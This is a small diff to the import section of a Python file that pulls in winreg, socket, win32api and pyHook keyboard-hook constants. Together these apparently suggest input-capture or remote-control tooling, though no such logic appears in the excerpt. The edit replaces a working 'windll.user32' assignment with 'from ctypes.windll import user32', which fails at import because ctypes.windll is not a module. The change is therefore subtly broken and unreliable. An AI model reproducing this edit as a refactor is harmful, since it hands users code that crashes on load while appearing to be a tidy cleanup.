@@ -1,13 +1,12 @@
 import winreg
-from ctypes import windll, create_unicode_buffer
+from ctypes import create_unicode_buffer
+from ctypes.windll import user32
 from threading import Thread
 import win32api
 from socket import *
 import struct
 from pyHook import GetKeyState, HookConstants
 from collections import OrderedDict
-
-user32 = windll.user32
 
 
 class Event:
